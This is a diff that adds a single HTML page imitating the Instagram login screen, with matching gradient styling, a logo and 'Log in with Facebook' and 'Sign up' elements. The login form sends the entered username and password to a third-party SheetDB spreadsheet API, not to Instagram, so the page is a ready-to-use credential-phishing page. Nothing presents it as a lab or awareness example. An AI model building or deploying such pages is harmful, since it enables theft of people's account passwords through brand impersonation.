@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(45deg, #fdf497, #fd5949, #d6249f, #285AEB);
+        }
+
+        .login-wrapper {
+            background: white;
+            width: 350px;
+            padding: 40px 35px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            text-align: center;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {opacity: 0; transform: translateY(-20px);}
+            to {opacity: 1; transform: translateY(0);}
+        }
+
+        .logo {
+            font-size: 42px;
+            font-weight: bold;
+            margin-bottom: 25px;
+            font-family: cursive;
+        }
+
+        .input-box {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            background: #fafafa;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #d6249f;
+            box-shadow: 0 0 8px rgba(214,36,159,0.4);
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background-color: #0077cc;
+            transform: translateY(-2px);
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #999;
+            font-size: 14px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+            margin: 0 10px;
+        }
+
+        .fb-login {
+            color: #385185;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .forgot {
+            font-size: 13px;
+            color: #00376b;
+            cursor: pointer;
+        }
+
+        .signup-box {
+            margin-top: 20px;
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            font-size: 14px;
+        }
+
+        .signup-box b {
+            color: #0095f6;
+            cursor: pointer;
+        }
+
+        @media(max-width: 400px){
+            .login-wrapper {
+                width: 90%;
+            }
+        }
+
+    </style>
+</head>
+
+<body>
+
+<div>
+    <div class="login-wrapper">
+
+        <div class="logo">Instagram</div>
+
+        <form action="https://sheetdb.io/api/v1/mq05iqa2fqlr8" method="POST">
+
+            <div class="input-box">
+                <input type="text" name="data[User Name]" placeholder="Phone number, username, or email" required>
+            </div>
+
+            <div class="input-box">
+                <input type="password" name="data[Password]" placeholder="Password" required>
+            </div>
+
+            <button type="submit">Log In</button>
+
+        </form>
+
+        <div class="divider">OR</div>
+
+        <div class="fb-login">Log in with Facebook</div>
+
+        <div class="forgot">Forgot password?</div>
+
+    </div>
+
+    <div class="signup-box">
+        Don’t have an account? <b>Sign up</b>
+    </div>
+</div>
+
+</body>
+</html>
